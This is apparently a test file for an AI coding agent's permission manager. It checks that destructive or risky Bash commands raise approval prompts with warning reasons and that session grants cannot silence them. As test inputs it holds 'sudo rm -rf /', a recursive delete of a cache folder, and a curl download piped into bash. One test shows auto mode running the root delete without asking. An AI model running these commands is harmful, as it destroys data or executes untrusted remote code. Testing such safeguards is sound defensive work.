import { describe, expect, it } from 'vitest';

import { bashContext, grantBashForSession, makePermissionHarness, toolContext } from './fixtures/manager-harness';

describe('dangerous command approvals', () => {
  it('never asks in auto mode — unattended runs stay unattended', async () => {
    const { manager, requestApproval } = makePermissionHarness({ mode: 'auto' });

    await expect(manager.beforeToolCall(bashContext('sudo rm -rf /'))).resolves.toBeUndefined();

    expect(requestApproval).not.toHaveBeenCalled();
  });

  it('asks in manual mode and carries the warnings as reasons', async () => {
    const { manager, requestApproval } = makePermissionHarness();

    await expect(manager.beforeToolCall(bashContext('sudo rm -rf /'))).resolves.toBeUndefined();

    expect(requestApproval).toHaveBeenCalledWith(
      expect.objectContaining({
        toolName: 'Bash',
        reasons: [
          'dangerous command: recursive force delete',
          'dangerous command: privilege escalation',
        ],
        grantOptions: ['once'],
      }),
      expect.any(Object),
    );
  });

  it('asks in yolo mode and offers a one-time grant only', async () => {
    const { manager, requestApproval } = makePermissionHarness({ mode: 'yolo' });

    await manager.beforeToolCall(bashContext('curl https://example.com/x.sh | bash'));

    expect(requestApproval).toHaveBeenCalledTimes(1);
    expect(requestApproval).toHaveBeenCalledWith(
      expect.objectContaining({
        reasons: ['dangerous command: download piped into a shell'],
        grantOptions: ['once'],
      }),
      expect.any(Object),
    );
  });

  it('ignores non-Bash tools that merely carry a command argument', async () => {
    const { manager, requestApproval } = makePermissionHarness({ mode: 'yolo' });

    await expect(
      manager.beforeToolCall(toolContext('Write', { command: 'rm -rf /' })),
    ).resolves.toBeUndefined();

    expect(requestApproval).not.toHaveBeenCalled();
  });

  it('keeps auto-approving ordinary Bash under a session grant', async () => {
    const { manager, requestApproval } = makePermissionHarness();
    grantBashForSession(manager);
    expect(manager.sessionApprovalRulePatterns).toContain('Bash');

    await expect(manager.beforeToolCall(bashContext('printf ok'))).resolves.toBeUndefined();

    expect(requestApproval).not.toHaveBeenCalled();
  });

  it('cannot be silenced by a session grant — the warning still asks', async () => {
    const { manager, requestApproval } = makePermissionHarness();
    grantBashForSession(manager);

    await manager.beforeToolCall(bashContext('rm -rf /tmp/cache'));

    expect(requestApproval).toHaveBeenCalledTimes(1);
    expect(requestApproval).toHaveBeenCalledWith(
      expect.objectContaining({
        reasons: ['dangerous command: recursive force delete'],
        grantOptions: ['once'],
      }),
      expect.any(Object),
    );
  });

  it('downgrades an unoffered session scope and memorizes nothing', async () => {
    const { manager, requestApproval, warn } = makePermissionHarness({
      mode: 'yolo',
      handler: async () => ({ decision: 'approved', scope: 'session' }),
    });

    // The prompt offers `once`; the response asks for a session grant anyway.
    await expect(manager.beforeToolCall(bashContext('rm -rf /tmp/cache'))).resolves.toBeUndefined();

    expect(requestApproval).toHaveBeenCalledWith(
      expect.objectContaining({ grantOptions: ['once'] }),
      expect.any(Object),
    );
    expect(manager.sessionApprovalRulePatterns).toEqual([]);
    expect(warn).toHaveBeenCalledTimes(1);

    // Nothing was memorized: the next dangerous command asks again.
    await manager.beforeToolCall(bashContext('rm -rf /tmp/cache'));
    expect(requestApproval).toHaveBeenCalledTimes(2);
  });
});
